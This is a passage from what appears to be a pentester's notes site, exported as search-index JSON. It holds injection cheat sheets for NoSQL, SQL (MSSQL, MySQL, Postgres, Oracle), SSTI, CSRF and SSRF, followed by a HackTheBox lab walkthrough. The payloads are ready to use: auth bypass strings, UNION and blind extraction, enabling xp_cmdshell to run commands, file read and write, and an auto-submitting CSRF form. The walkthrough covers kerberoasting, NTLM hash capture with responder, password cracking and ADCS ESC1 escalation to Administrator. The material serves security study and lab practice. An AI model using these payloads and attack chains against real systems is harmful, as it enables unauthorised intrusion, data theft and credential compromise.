DB, Virtuoso"},{"location":"Web%20Application/Injections/NoSQL%20Injection/#mongodb","title":"MongoDB","text":"<p>MongoDB Usage cheatsheet: https://www.mongodb.com/developer/products/mongodb/cheat-sheet/#connect-mongodb-shell</p> <p>Mongo uses query operators to interact and compare fields. Here are some examples: query operators.</p> Type Operator Description Example Comparison <code>$eq</code> Matches values which are <code>equal to</code> a specified value <code>type: {$eq: \"Pink Lady\"}</code> Comparison <code>$gt</code> Matches values which are <code>greater than</code> a specified value <code>price: {$gt: 0.30}</code> Comparison <code>$gte</code> Matches values which are <code>greater than or equal to</code> a specified value <code>price: {$gte: 0.50}</code> Comparison <code>$in</code> Matches values which exist <code>in the specified array</code> <code>type: {$in: [\"Granny Smith\", \"Pink Lady\"]}</code> Comparison <code>$lt</code> Matches values which are <code>less than</code> a specified value <code>price: {$lt: 0.60}</code> Logical <code>$not</code> Matches documents which <code>do not meet the conditions</code> of a specified query <code>type: {$not: {$eq: \"Granny Smith\"}}</code> Evaluation <code>$regex</code> Matches values which <code>match a specified RegEx</code> <code>type: {$regex: /^G.*/}</code>"},{"location":"Web%20Application/Injections/NoSQL%20Injection/#basic-injection-example","title":"Basic Injection Example","text":"<p>Auth Bypass Normal data: <pre><code>email=test@test.com&amp;password=test\n</code></pre> Becomes: <pre><code>email[$ne]=test@test.com&amp;password[$ne]=test\n</code></pre>  This will evaluate to TRUE (unless the values actually exist) and bypass auth. OR match anything and always eval to true: <pre><code>email[$regex]=.*&amp;password[$regex]=.*\n</code></pre> Data Extraction Ways can match ALL data from an injection point and return it: - <code>name: {$ne: 'doesntExist'}</code>: Assuming <code>doesntExist</code> doesn't match any documents' names, this will match all documents. - <code>name: {$gt: ''}</code>: This matches all documents whose name is 'bigger' than an empty string. - <code>name: {$gte: ''}</code>: This matches all documents whose name is 'bigger or equal to' an empty string. - <code>name: {$lt: '~'}</code>: This compares the first character of <code>name</code> to a Tilde character and matches if it is 'less'. This will not always work, but it works in this case because Tilde is the largest printable ASCII value, and we know that all names in the collection are composed of ASCII characters. - <code>name: {$lte: '~'}</code>: Same logic as above, except it additionally matches documents whose names start with <code>~</code>.</p>"},{"location":"Web%20Application/Injections/NoSQL%20Injection/#server-side-javascript-injection","title":"Server-Side JavaScript Injection","text":"<p>Execute arbitrary JavaScript in the context of the database. Auth bypass  we could set <code>username</code> to <code>\" || true || \"\"==\"</code>, which should result in the query statement always returning <code>True</code>, regardless of what <code>this.username</code> and <code>this.password</code> are. </p>"},{"location":"Web%20Application/Injections/SQL%20Injection/","title":"SQL Injection","text":"<p>note</p> <p>Think outside the box for injectable parameters. Anything that could be passed to a db is worth testing against. ie UAs, cookies, etc\u2026</p> <p>note</p> <p>when fuzzing for SQL injection, try 1. replacing valid data with payloads, 2. appending payloads to the end of valid data</p> <p>note</p> <p>Be very careful with SQL injection payloads, likely potential for DOS, ask for permission if you find something.</p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#key-delimiters-and-enclosures","title":"Key Delimiters and Enclosures","text":"<ul> <li><code>'</code>, <code>\"</code>: Standard string delimiters. E.g., <code>' OR '1'='1</code></li> <li><code>\\\\: MySQL identifier quoting. E.g.,</code> column <code>= 'value'</code> `</li> <li><code>;</code>: Statement separator. E.g., <code>SELECT * FROM users; DROP TABLE users;</code></li> <li><code>-</code>, <code>/*...*/</code>: SQL comments. E.g., <code>-comment</code>, <code>/* comment */</code></li> </ul>"},{"location":"Web%20Application/Injections/SQL%20Injection/#injection-patterns","title":"Injection Patterns","text":"<ul> <li>Basic Injection: <code>' OR 1=1--</code></li> <li>Closing Brackets: Try closing out functions or statements. E.g., <code>')</code>, <code>'))</code>, <code>')))--</code>, <code>%'))-- -</code></li> <li>Logical Operators: <code>OR</code>, <code>AND</code>. E.g., <code>' OR 'x'='x</code></li> <li>Union Injection: <code>' UNION SELECT ... --</code></li> <li>Conditional Time Delays (for blind SQLi):<ul> <li>MySQL: <code>'; SELECT SLEEP(5);--</code></li> <li>MSSQL: <code>'; WAITFOR DELAY '00:00:05';--</code></li> <li>Oracle: <code>'; dbms_lock.sleep(5);--</code></li> <li>PostgreSQL: <code>'; SELECT pg_sleep(5);--</code></li> </ul> </li> <li>Out-of-Band: Through DNS or HTTP. E.g., DNS lookup triggered by SQL query.</li> </ul>"},{"location":"Web%20Application/Injections/SQL%20Injection/#enumerate-db-type","title":"Enumerate DB Type","text":"<p>https://portswigger.net/web-security/sql-injection/cheat-sheet</p> <p>PostgreSQL:     <code>SELECT pg_sleep(10)</code> MySQL:  <code>SELECT SLEEP(10)</code> Oracle:     <code>dbms_pipe.receive_message(('a'),10)</code> Microsoft:  <code>WAITFOR DELAY '0:0:10'</code></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#automated","title":"Automated","text":"<p>See SQLMap cheat sheet</p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#cheat-sheet-per-db-type","title":"Cheat Sheet Per DB Type","text":""},{"location":"Web%20Application/Injections/SQL%20Injection/#basic","title":"Basic","text":"<p>Logical or <pre><code>' OR 1=1-- -\n</code></pre> Union - Enum number of columns <pre><code>' union select null#\n' union select null,null#\n' union select null,null,null#\n</code></pre> Now that you know number of columns, return any query results <pre><code>' union select null,null,version()#\n</code></pre> <pre><code>' union select null,null,table_name from information_schema.tables#\n</code></pre> <pre><code>' union select null,null,&lt;COLUMN&gt; from &lt;TABLE&gt;#\n</code></pre> Column types must match in union select. <pre><code>' union select null(int),1,null,null from &lt;table&gt;#\n</code></pre> https://portswigger.net/web-security/sql-injection/cheat-sheet</p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#blind","title":"Blind","text":"<p>manual logical value extraction - Compare results against passed char, if response does not change, we have a valid char <pre><code>Cookie: session=2345234r346326sdfsg' and substring((select version()), 1, 1) = '7'#\n</code></pre> <pre><code>Cookie: session=2345234r346326sdfsg' and substring((select version()), 1, 2) = '7.'#\nCookie: session=2345234r346326sdfsg' and substring((select version()), 1, 3) = '7.0'#\nCookie: session=2345234r346326sdfsg' and substring((select version()), 1, 5) = '7.0.3'#\n</code></pre> sqlmap <pre><code>sqlmap -r r --level=2\n</code></pre> <pre><code>sqlmap -r r --level=2 --dump\n</code></pre> <pre><code>sqlmap -r r --level=2 -T &lt;TABLENAME&gt; --dump\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#second-order","title":"Second-order","text":"<p>Injection achieved when query is executed not at the injection point, but when the query is retrieved. - Signup endpoint, you signup with the user <code>' or 1=1-- -</code> and the query only returns data when you navigate to the \u201caccounts\u201d page after your user is created.</p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#mssql","title":"MSSQL","text":""},{"location":"Web%20Application/Injections/SQL%20Injection/#list-databases","title":"List databases","text":"<p>Normal <pre><code>Select name from sys.databases\n</code></pre> Error based <pre><code>cast((SELECT name FROM sys.databases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) as integer)\n</code></pre> Union Based <pre><code>' UNION SELECT name, NULL FROM master..sysdatabases --\n</code></pre> Stacked Queries <pre><code>; SELECT name FROM master..sysdatabases; --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#list-tables","title":"List Tables:","text":"<p>Normal <pre><code>select * from app.information_schema.tables;\n</code></pre> Error based` <pre><code>cast((SELECT TABLE_NAME FROM exercise.information_schema.tables ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) as integer)\n</code></pre> Union Based <pre><code>' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables --\n</code></pre> Stacked Queries <pre><code>; SELECT * FROM information_schema.tables; --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#list-columns","title":"List columns","text":"<p>Normal <pre><code>select COLUMN_NAME, DATA_TYPE from app.information_schema.columns where TABLE_NAME = 'menu';\n</code></pre> Error based <pre><code>cast((SELECT+column_name+FROM+exercise.information_schema.columns+where+table_name+%3d+'secrets'+ORDER+BY+name+OFFSET+0+ROWS+FETCH+NEXT+1+ROWS+ONLY)+as+integer)\n</code></pre> Union Based <pre><code>' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE TABLE_NAME = 'table_name' --\n</code></pre> Stacked Queries: <pre><code>; SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'table_name'; --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#command-execution","title":"Command Execution","text":"<p>Normal</p> <p>To use <code>xp_cmdshell</code> for command execution, it first needs to be enabled by a user with administrative privileges: <pre><code>EXEC sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\n</code></pre> After enabling, you can execute system commands like so: <pre><code>EXEC xp_cmdshell 'your_command_here';\n</code></pre></p> <p>SQLi Just like before, you will need to enable the privs first, sometimes they may be enabled by default: <pre><code>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --\n</code></pre> <pre><code>'; EXEC xp_cmdshell 'your_command_here'; --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#mysql","title":"MYSQL","text":""},{"location":"Web%20Application/Injections/SQL%20Injection/#list-databases_1","title":"List databases","text":"<p>Normal <pre><code>SHOW DATABASES;\n</code></pre></p> <p>Error based (32 character limit) <pre><code>' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 1)))--\n</code></pre> Union Based <pre><code>' UNION SELECT schema_name, NULL FROM information_schema.schemata --\n</code></pre> Stacked Queries: <pre><code>; SHOW DATABASES; --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#list-tables_1","title":"List Tables","text":"<p>Normal <pre><code>SHOW TABLES;\n</code></pre> Error based <pre><code>' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT table_name FROM information_schema.tables WHERE table_schema = 'database_name' LIMIT 1 OFFSET 1)))--\n</code></pre></p> <p>Union Based <pre><code>' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables WHERE table_schema = 'database_name' --\n</code></pre> Stacked Queries: <pre><code>; SHOW TABLES; --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#list-columns_1","title":"List columns","text":"<p>Normal <pre><code>SHOW COLUMNS FROM table_name;\n</code></pre> Error based <pre><code>' EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1)))--\n</code></pre></p> <p>Union Based <pre><code>' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'table_name' --\n</code></pre> Stacked Queries: <pre><code>; SHOW COLUMNS FROM table_name; --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#read-files","title":"Read Files:","text":"<p>Normal <pre><code>SELECT LOAD_FILE('/path/to/file');\n</code></pre> SQLi <pre><code>' UNION SELECT LOAD_FILE('/path/to/file'), NULL --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#write-files","title":"Write Files:","text":"<p>Normal <pre><code>SELECT * INTO OUTFILE '/path/to/file' FROM table_name;\n</code></pre> SQLi <pre><code>' UNION SELECT column_name FROM table_name INTO OUTFILE '/path/to/file' --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#postgres","title":"Postgres","text":""},{"location":"Web%20Application/Injections/SQL%20Injection/#list-databases_2","title":"List databases","text":"<p>Normal <pre><code>SELECT datname FROM pg_database;\n</code></pre> Error based <pre><code>' (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 1) AS integer))--\n</code></pre> Union Based <pre><code>' UNION SELECT datname, NULL FROM pg_database --\n</code></pre> Stacked Queries <pre><code>; SELECT datname FROM pg_database; --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#list-tables_2","title":"List Tables:","text":"<p>Normal <pre><code>SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';\n</code></pre> Error based <pre><code>' (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 1) AS integer))--\n</code></pre> Union Based <pre><code>' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public' --\n</code></pre> Stacked Queries: <pre><code>; SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'; --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#list-columns_2","title":"List columns:","text":"<p>Normal <pre><code>SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name';\n</code></pre> Error based <pre><code>' (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name' LIMIT 1 OFFSET 1) AS integer))--\n</code></pre> Union Based <pre><code>' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'table_name' --\n</code></pre> Stacked Queries: <pre><code>; SELECT column_name FROM information_schema.columns WHERE table_name = 'table_name'; --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#read-files_1","title":"Read Files:","text":"<p>Normal <pre><code>SELECT pg_read_file('/path/to/file', 0, 1000000);\n</code></pre> SQLi <pre><code>' UNION SELECT pg_read_file('/path/to/file', 0, 1000000), NULL --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#write-files_1","title":"Write Files:","text":"<p>Normal <pre><code>COPY table_name TO '/path/to/file' DELIMITER ',' CSV HEADER;\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#oracle","title":"ORACLE","text":""},{"location":"Web%20Application/Injections/SQL%20Injection/#list-databases_3","title":"List databases:","text":"<p>Normal <pre><code>SELECT name FROM v$database;\n</code></pre></p> <p>Error based <pre><code>' AND (SELECT COUNT(*) FROM v$database) --\n</code></pre> Union Based <pre><code>' UNION SELECT name, NULL FROM v$database --\n</code></pre> Stacked Queries: <pre><code>; SELECT name FROM v$database; --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#list-tables_3","title":"List Tables:","text":"<p>Normal <pre><code>SELECT table_name FROM all_tables;\n</code></pre> Error based <pre><code>' AND (SELECT COUNT(*) FROM all_tables) --\n</code></pre> Union Based <pre><code>' UNION SELECT table_name, NULL FROM all_tables --\n</code></pre> Stacked Queries: <pre><code>; SELECT table_name FROM all_tables; --\n</code></pre></p>"},{"location":"Web%20Application/Injections/SQL%20Injection/#list-columns_3","title":"List columns:","text":"<p>Normal <pre><code>SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name';\n</code></pre> Error based <pre><code>' AND (SELECT COUNT(*) FROM all_tab_columns WHERE table_name = 'table_name') --\n</code></pre> Union Based <pre><code>' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'table_name' --\n</code></pre> Stacked Queries: <pre><code>; SELECT column_name FROM all_tab_columns WHERE table_name = 'table_name'; --\n</code></pre></p>"},{"location":"Web%20Application/Injections/Server-Side%20Template%20Injection%20%28SSTI%29/","title":"Server Side Template Injection (SSTI)","text":"<p>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection 1. First try to generate an error to leak the templating engine 2. Use hacktricks payloads for execution</p>"},{"location":"Web%20Application/Request%20Forgery/Cross-Site%20Request%20Forgery%20%28CSRF%29/","title":"Cross Site Request Forgery (CSRF)","text":"<ul> <li>Checklist<ul> <li>Does every form have a CSRF token?</li> <li>Can we use GET instead of POST (i.e. can our payload be in the URI instead of the body)<ul> <li>Test the token</li> <li>Test without the token</li> </ul> </li> <li>Test other HTTP methods without the token (e.g. GET)</li> <li>Test without the token value (keep the param name, e.g. &amp;csrf=)</li> <li>Test with a random token</li> <li>Test a previous token</li> <li>Test a token from a different session</li> <li>Test with a token of the same length</li> <li>Test for predictability<ul> <li>Test for static values</li> </ul> </li> <li>Test for known values (e.g. the token is the user-id)</li> <li>Is the token tied to a cookie other than the session cookie?</li> <li>Can the token be stolen with XSS?</li> <li>Is the referer header being used to validate the request origin?<ul> <li>Do the cookies have SameSite set? (Chrome is lax by default)</li> </ul> </li> <li>Can we submit the request with GET?</li> <li>Can we override HTTP methods with <code>X-Http-Method-Override: GET</code><ul> <li>Can we override HTTP methods with <code>_method=POST</code> <pre><code>&lt;!-- original payload generated from BURP Suite Pro --&gt;\n&lt;html&gt;\n  &lt;body&gt;\n  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n    &lt;form action=\"https://&lt;target-site&gt;/api/employees/add\" method=POST&gt;\n      &lt;input type=\"hidden\" name=\"name\" value=\"&lt;payload-info&gt;\" /&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"&lt;payload-info&gt;\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <pre><code>&lt;!-- requires user interaction --&gt;\n&lt;a href=\"http://&lt;target-site&gt;m/api/employees/add?name=&lt;payload-info&gt;\"&gt;Click Me&lt;/a&gt;\n</code></pre> <pre><code>&lt;!-- doesn't require user interaction --&gt;\n&lt;img src=\"http:/&lt;target-site&gt;/api/employees/add?name=&lt;payload-info&gt;\"&gt;\n</code></pre> <pre><code>document.location = 'https://&lt;target-site&gt;/employees/add?name=&lt;payload-info&gt;';\n</code></pre></li> </ul> </li> </ul> </li> </ul>"},{"location":"Web%20Application/Request%20Forgery/Server%20Side%20Request%20Forgery/","title":"Server Side Request Forgery","text":"<p>Force the server to make a request to an arbitrary endpoint.</p> <p>Things to assess:</p> <ul> <li>Have a referrer header? Try blind SSRF</li> <li>API interactions where an entire URL is being passed via a controllable input</li> <li>HTTP parameters that are being passed URLs (or sometimes files)</li> </ul> <p>Found an SSRF?</p> <ul> <li>Try requesting localhost</li> <li>Can you make a request to a sensitive endpoint coming from localhost?</li> <li>Fuzz LAN subnets</li> <li>Found alive IP on LAN? <ul> <li>Fuzz for open ports</li> </ul> </li> </ul> <p>Blind SSRF</p> <ul> <li>We find an ssrf but we do not receive a response with data indicating we've hit an endpoint.</li> <li>Data exfil CAN be possible, but it is pretty difficult. </li> <li>Use a tool like burp collaborator OR:<ul> <li>https://github.com/projectdiscovery/interactsh-web</li> </ul> </li> </ul> <p>Misc</p> <ul> <li>Payloads delivered via http request headers may take SSRF to further compromise.<ul> <li>Ex: https://infosecwriteups.com/shellshock-a-deep-dive-into-cve-2014-6271-3eb5b33e5de6 (Shell shock payload delivered via UA)</li> </ul> </li> </ul>"},{"location":"writeups/","title":"Index","text":"<p>Migrating writeups to new site (in progress)</p>"},{"location":"writeups/HackTheBox/OverCertified/","title":"OverCertified","text":""},{"location":"writeups/HackTheBox/OverCertified/#network-recon","title":"Network recon","text":"<pre><code>sudo nmap -T4 -A -v -o nmap --min-rate 1000 10.129.229.25 -Pn\n</code></pre> <p>Multi-protocol recon <pre><code>enum4linux-ng -A 10.129.229.25\n</code></pre> </p> <p>We have anonymous LDAP access</p>"},{"location":"writeups/HackTheBox/OverCertified/#ldap-enumeration","title":"LDAP Enumeration","text":"<p>Get users: <pre><code>ldapsearch -x -b \"DC=certified,DC=htb\" -s sub \"(&amp;(objectclass=user))\" -H ldap://10.129.229.25 | grep -i samaccountname: | cut -f 2 -d \" \" &gt; users.txt\n</code></pre> Validate users: <pre><code>kerbrute userenum -d certified.htb --dc 10.129.229.25 users.txt\n</code></pre>  All users but guest are valid + all users require preauth for tickets requests.  Getting users descriptions <pre><code>nxc ldap 10.129.229.25 -u '' -p '' -M get-desc-users\n</code></pre> We get a password </p>"},{"location":"writeups/HackTheBox/OverCertified/#lateral-movement-to-mssqlserver","title":"Lateral Movement to MSSQLSERVER","text":"<p>Lets check for users with SPNs set <pre><code>ldapsearch -x -b \"DC=certified,DC=htb\" -s sub \"(&amp;(objectClass=user)(servicePrincipalName=*))\" -H ldap://10.129.229.25 | grep -i samaccountname: | cut -f 2 -d \" \"\n</code></pre>  user is kerberoastable!  <pre><code>impacket-GetUserSPNs -dc-ip 10.129.229.25 certified.htb/ldapusr:'ldapisfun' -request-user MSSQLSERVER\n</code></pre>  Try to crack the hash <pre><code>hashcat -m 13100 mssqlserver.hash /usr/share/wordlists/rockyou.txt\n</code></pre> <pre><code>MSSQLSERVER:lucky7\n</code></pre></p>"},{"location":"writeups/HackTheBox/OverCertified/#mssql-enumeration","title":"MSSQL Enumeration","text":"<p><pre><code>nxc mssql 10.129.229.25 -u 'MSSQLSERVER' -p 'lucky7' -q 'SELECT name FROM master.dbo.sysdatabases;'\n</code></pre> <pre><code>impacket-mssqlclient MSSQLSERVER:'lucky7'@10.129.229.25 -windows-auth\n</code></pre></p> <p>We enumerate stored procedures and tables, we find out we can't run <code>xp_cmdshell</code> to get RCE. We can run <code>xp_dirtree</code> for force auth. Start responder: <pre><code>sudo responder -I tun0\n</code></pre> Trigger auth: <pre><code>xp_dirtree \\\\10.10.14.4\\test\n</code></pre>  Lets try to crack the NTLMv2 hash <pre><code>hashcat -m 5600 thomas.hash /usr/share/wordlists/rockyou.txt\n</code></pre> <pre><code>thomas:159357\n</code></pre> we have access with winrm <pre><code>nxc winrm 10.129.229.25 -u thomas -p '159357'\n</code></pre> <pre><code>evil-winrm -i 10.129.229.25 -u thomas -p '159357'\n</code></pre> after grabbing the user flag and poking around, i decided to run bloodhound <pre><code>sudo bloodhound-ce-python -u 'thomas' -p '159357' -ns 10.129.229.25 -d certified.htb -c all\n</code></pre>  We see <code>thomas</code> has inherited access to the <code>CERTIFICATE SERVICE DCOM ACCESS</code> group. This makes me think the priv esc is an ADCS misconfiguration </p>"},{"location":"writeups/HackTheBox/OverCertified/#administrator","title":"Administrator","text":"<p>Use certipy to find vulnerable templates <pre><code>certipy-ad find -vulnerable -u thomas -p '159357' -dc-ip 10.129.229.25\n</code></pre>  We see this template is vulnerable to ESC1  Lets collect what we need for ESC1: Template name, CA, target domain. </p> <p>we can build our pfx request targeting the administrator user <pre><code>certipy-ad req -u thomas -p '159357' -dc-ip 10.129.229.25 -template Auth -upn Administrator@certified.htb -ca CERTIFIED-CA -target certified.certified.htb\n</code></pre>  We can either use the pfx directly with nxc: <pre><code>nxc smb 10.129.229.25 --pfx-cert administrator.pfx -u 'Administrator'\n</code></pre>  OR use <code>certipy auth</code> to get a TGS and NTLM hash <pre><code>certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.25\n</code></pre>  and use that to auth.</p>"}]}